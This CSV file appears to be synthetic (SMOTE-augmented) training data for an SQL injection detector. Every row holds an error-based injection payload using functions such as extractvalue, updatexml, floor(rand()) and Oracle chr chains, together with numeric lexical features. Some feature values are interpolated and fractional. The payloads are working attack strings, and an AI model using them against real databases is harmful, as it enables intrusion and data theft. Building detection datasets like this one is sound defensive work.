id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000153,attack,error,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000210,0.4576873142022243,177.7824057659791,36.0,3.965802235617632,61.0,31.0,66.0,19.7824057659791,0.3431179219283716,0.17437140294720524,0.37124234175856596,0.11126833336585723,0.7824057659791025,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.0,0.7824057659791025,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'beoh'  =  'beoh",nearest_attack_euclidean,R000277,0.3975843118978435,187.9656730773933,31.45976362177528,3.637910416670446,60.0,24.0,78.80472756449441,25.160945512898884,0.32051858191978183,0.12820743276791274,0.4175495062318386,0.13372447908046686,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,16.160945512898884,0.0,0.0,4.0,1.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000155,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000257,0.31288938819274825,174.53329855318677,33.20887961418314,3.8228049830547373,55.81331942127471,32.0,66.41775922836628,20.302219903545783,0.31966506135912925,0.18362271689341886,0.3803144025888176,0.11639781915863427,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,13.302219903545785,0.0,0.0,4.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,error,"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000212,0.10172692281777097,161.7960056621086,34.0,3.7128066334310326,50.0,23.0,67.03680452968689,21.759201132421722,0.30908595623571367,0.14217953986842827,0.41426072661782937,0.1344737772780287,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,14.759201132421722,1.0,0.0,4.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,error,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000137,0.5028775615189562,183.59022769806168,32.0,3.854014428590012,50.60651486795889,43.78697026408222,66.0,23.196742566020554,0.27568865997518455,0.2384580694315293,0.3595112806841745,0.1263419899091117,2.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,12.0,0.0,0.0,5.196742566020555,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.19674256602055518,0.8032574339794449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000158,attack,error,"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""ardk"" like ""ardk",nearest_attack_euclidean,R000136,0.5801667986758287,360.38204668597723,30.59800518733081,3.37628351130914,89.80066493755639,45.598005187330806,163.98670124887207,60.99667531221802,0.24942741575912222,0.1265400762527355,0.4547905867826356,0.16924192120550666,0.0,4.0,0.19933506244360272,-1.3877787807814457e-17,0.0,2.0,0.0,32.79734024977441,0.0,0.0,0.0,22.199335062443602,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-1.1102230246251565e-16,1.8006649375563974,0.19933506244360277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000159,attack,error,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",nearest_attack_euclidean,R000205,1.0217827711227647,345.8507645197242,35.29637396287684,3.5749282327544742,91.03626037123158,49.88912188863053,147.22175622273895,57.70362603712316,0.26306734068943005,0.14437504421389627,0.4256790030996575,0.16687861199701615,0.7036260371231572,0.0,0.2963739628768428,-1.3877787807814457e-17,0.0,2.0,0.0,30.703626037123158,0.0,0.0,1.0,22.296373962876842,0.7036260371231572,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7036260371231572,0.2963739628768428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000160,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc",nearest_attack_euclidean,R000177,0.0513497703065622,284.1474159810049,36.914741598100484,4.006486930940783,112.0,35.0,102.3179327848039,34.829483196200975,0.39420082181980803,0.12318775681869,0.3600437256475357,0.12256769571396628,0.0,4.0,0.0,-1.3877787807814457e-17,2.0,1.0,0.0,19.829483196200975,0.0,2.0,5.0,3.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000161,attack,error,"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000125,0.6886546273093762,185.2728822636441,30.54576452728824,3.8551514865604783,48.27288226364412,47.0,66.0,24.0,0.26054591311012043,0.2536813290790098,0.3562333557279712,0.1295394020828986,2.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,12.0,0.0,0.0,6.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.27288226364412066,0.7271177363558793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000162,attack,error,"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",nearest_attack_euclidean,R000171,0.6105073204871329,288.5586332178714,37.34636293730475,3.946464028672717,97.03908881191424,55.0,105.51954440595712,31.0,0.3362438753661331,0.19062853344261554,0.3656824177963226,0.10744517339492876,0.0,0.0,0.0,-1.3877787807814457e-17,2.0,1.0,0.0,20.0,0.0,0.0,6.826818531347626,4.0,0.0,0.0,-2.7755575615628914e-17,0.17318146865237352,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.0,0.17318146865237358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.173181468652373
SMOTE_000163,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000285,0.09969732941366573,185.9537363709946,34.09252725801083,3.800839895203826,60.0,32.0,72.0,21.953736370994584,0.3226613140871934,0.1720860341798365,0.3871935769046321,0.11805907482833805,0.9537363709945847,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,14.0,0.0,0.0,4.0,3.0,0.9537363709945846,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000109,0.3521859093755932,181.9535428176461,29.831397617401922,3.734538871942445,49.0,39.0,69.62795234803843,24.325590469607686,0.2700211204677864,0.21491476935191164,0.3814612541831601,0.13360285599714178,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,13.325590469607686,0.0,0.0,6.0,1.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000165,attack,error,"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000056,0.62136342508009,187.7016163171181,32.70161631711809,3.9074707109247635,50.532255788587946,43.93548842282412,66.0,27.23387210570603,0.26925835632684836,0.2340210197982559,0.35163786442640604,0.1450827594484897,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,12.0,0.0,0.0,5.23387210570603,6.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.2338721057060299,0.7661278942939702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000166,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",nearest_attack_euclidean,R000069,0.6903903607728057,178.38016317299898,28.0,3.7126669089382944,47.03687286984647,39.0,67.87094495553737,24.472345347615153,0.26444733306526214,0.21892437574648144,0.3795604204525295,0.13706787073572688,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.4907817825383836,0.0,12.981563565076767,0.0,0.0,6.0,1.4907817825383836,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000167,attack,error,"-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000103,0.41835673089346637,221.17077142450032,39.80487142924995,3.9445124299813705,68.0,45.0,85.78051428300022,22.390257141500108,0.3074896931442876,0.20348582634548446,0.3878157194524843,0.10120876105774369,0.19512857075005297,0.0,1.0,-1.3877787807814457e-17,1.0,2.0,0.0,14.195128570750052,0.0,0.0,3.0,4.0,0.19512857075005285,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000168,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000302,0.1935206460823628,215.28216065404075,34.0,3.705604272374687,59.0,40.0,88.0,28.28216065404076,0.27406504240016133,0.185806808406889,0.4087749784951558,0.13135317069779381,2.14108032702038,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,16.0,0.0,0.0,4.0,5.14108032702038,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0705401635101901,4.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000169,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000024,0.04300366494701341,149.31840345292306,38.053067242153844,4.137544501426197,75.26533621076922,1.0,53.0,20.05306724215384,0.5040335499647276,0.006697622712581813,0.354974003766836,0.13429482355585456,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,8.0,0.0,5.053067242153843,0.0,2.000000000000001,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000170,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R000272,0.6588517590990287,375.7389318396994,35.50316233151447,3.6298453838777878,99.97470134788423,56.006324663028934,157.0126493260579,62.745256502728296,0.26594523872933296,0.14910274333733323,0.4179771827967034,0.16697483513663047,2.4968376684855293,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,31.50316233151447,0.0,0.7452565027282944,0.7515811657572353,25.496837668485526,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.2484188342427647,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.248418834242765
SMOTE_000171,attack,error,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000137,0.19164383380865013,183.50463415958066,31.495365840419353,3.852283221936071,50.24304876062902,44.00926831916129,66.0,23.252317079790323,0.27383670302928664,0.2397872347819982,0.35967195821791986,0.1267041039707953,2.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,12.0,0.0,0.0,5.252317079790323,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000172,attack,error,-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000232,0.5258028168850607,440.21412213501117,34.21412213501122,3.49082236156518,111.0,62.0,195.0,72.21412213501122,0.2521502393476281,0.14084067423020669,0.44296663669177905,0.16404244973038618,0.0,0.2141221350112238,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,40.0,0.0,0.0,0.0,32.0,0.0,0.21412213501122382,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000173,attack,error,"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",nearest_attack_euclidean,R000215,0.5505966501471734,348.505692140043,40.0,4.059609587251467,119.33712809336198,63.0,125.58428202334049,40.58428202334049,0.3423605813295755,0.18080781748882074,0.3603893282618318,0.11644227291977201,4.0,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,22.0,0.0,0.0,6.0,8.584282023340494,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7921410116702473,7.0,3.0,1.0,1.7921410116702472,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,15.792141011670248
SMOTE_000174,attack,error,"-1000"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""isbq""  =  ""isbq",nearest_attack_euclidean,R000305,0.004710849261549282,357.11112284068014,32.99673168115647,3.4085097350729168,85.0,48.0,162.0915129276189,62.0196099130612,0.23802757103843614,0.1344155695275875,0.4538865955638403,0.17367026387013604,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,3.0,0.0,32.019609913061196,0.0,0.0,0.0,24.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000175,attack,error,"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000173,0.47643059098650686,138.3721000861375,25.662789991386248,3.6336784307743732,31.0,38.66278999138625,50.3721000861375,18.337210008613752,0.22428939449960344,0.2798449422977155,0.3633075252914483,0.13255813791123275,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,10.6744200172275,0.0,0.0,6.66278999138625,1.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",nearest_attack_euclidean,R000077,1.365134813260962,151.54275659648874,27.817844574561093,3.7883821102942656,41.27137829824437,39.0,52.45353372368328,18.817844574561093,0.27173806393569766,0.25803523207268964,0.34605373999184574,0.12417296399976702,0.40892228728054625,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,10.408922287280546,0.0,0.0,6.0,1.0,0.40892228728054625,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.5910777127194538,0.40892228728054625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,error,"1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000161,0.14330384041266442,165.3981094430003,33.06635157383338,3.903066369845888,54.0,32.0,60.26540629533352,19.13270314766676,0.32651079532440136,0.19348787871075637,0.3643418561811098,0.11565946978373241,0.06635157383337997,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,12.06635157383338,0.0,0.0,4.0,3.0,0.06635157383337992,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
